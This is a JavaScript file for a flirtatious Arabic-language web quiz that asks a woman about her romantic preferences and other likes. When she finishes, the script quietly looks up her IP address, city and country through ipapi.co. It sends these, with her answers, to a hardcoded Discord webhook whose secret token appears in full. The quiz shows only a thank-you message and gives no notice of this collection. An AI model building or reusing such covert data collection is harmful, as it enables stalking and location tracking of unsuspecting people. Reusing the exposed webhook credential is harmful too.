const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1557666233556537404/CrdsVi1q13B_Di4JUi8syc-tnuJsttLNhCHRBHdni7wPz2Vztst8TSFHDrXtYzpTtYknp";

const quizData = [
    {
        question: "🐒, تحبين الشخص اللي يهتم بيج من بعيد؟",
        options: ["اي", "لا"],
        messages: [
            "✨, حليوة حركة الاهتمام الهادئ",
            "🙃, يعني تفضلين الاهتمام المباشر"
        ]
    },
    {
        question: "🤫, تحبين واحد يغار عليج بس ما يبين؟",
        options: ["اي", "لا"],
        messages: [
            "😅, الغيرة السكتية الها طعم ثاني",
            "❤️, يعني تحبين الغيرة تكون واضحة ومبينة"
        ]
    },
    {
        question: "🐾, تحبين البزازين كلش؟",
        options: ["اي", "لا"],
        messages: [
            "😻, أصلاً البزازين يخبلون",
            "😾, أفاااا ليش ما تحبين البزازين"
        ]
    },
    {
        question: "🖤, الأسود يعجبج أكثر من باقي الألوان؟",
        options: ["اي", "لا"],
        messages: [
            "✨, سيد الألوان أكيد",
            "🫣, يعني تحبين الألوان الفاتحة أكثر"
        ]
    },
    {
        question: "👁️, إذا واحد يحب نفس الأشياء اللي تحبينها، يلفت نظرج؟",
        options: ["اي", "لا"],
        messages: [
            "💛, نفس الوايب والاهتمام دائماً يلفت",
            "🫣, تفضلين الاختلاف بين الأشخاص أكثر"
        ]
    }
];

let currentQuestion = 0;
let userAnswers = [];

async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        return await response.json();
    } catch (e) {
        return {};
    }
}

function loadQuestion() {
    const q = quizData[currentQuestion];
    document.getElementById('question').innerText = q.question;
    const optionsContainer = document.getElementById('options-container');
    optionsContainer.innerHTML = '';

    q.options.forEach((opt, index) => {
        const btn = document.createElement('button');
        btn.innerText = opt;
        btn.onclick = () => selectAnswer(index);
        optionsContainer.appendChild(btn);
    });
}

async function selectAnswer(index) {
    const q = quizData[currentQuestion];
    userAnswers.push({
        question: q.question,
        answer: q.options[index],
        comment: q.messages[index]
    });

    currentQuestion++;

    if (currentQuestion < quizData.length) {
        loadQuestion();
    } else {
        document.getElementById('quiz-container').innerHTML = '<h2>شُكراً لمشاركتك! ✨</h2>';
        await sendToDiscord();
    }
}

async function sendToDiscord() {
    const ipData = await getIPInfo();
    
    let answersText = userAnswers.map((a, i) => 
        `**س${i+1}: ${a.question}**\nالجواب: ${a.answer}\nتعليق: ${a.comment}`
    ).join('\n\n');

    const payload = {
        embeds: [{
            title: "🎯 إجابات كويز جديدة!",
            color: 3447003,
            fields: [
                { name: "📝 الإجابات", value: answersText },
                { name: "🌐 معلومات الجهاز والاتصال", value: `**IP:** ${ipData.ip || 'غير معروف'}\n**المدينة:** ${ipData.city || 'غير معروف'}\n**الدولة:** ${ipData.country_name || 'غير معروف'}` }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error(e);
    }
}

// تشغيل الكويز فور فتح الصفحة
window.onload = loadQuestion;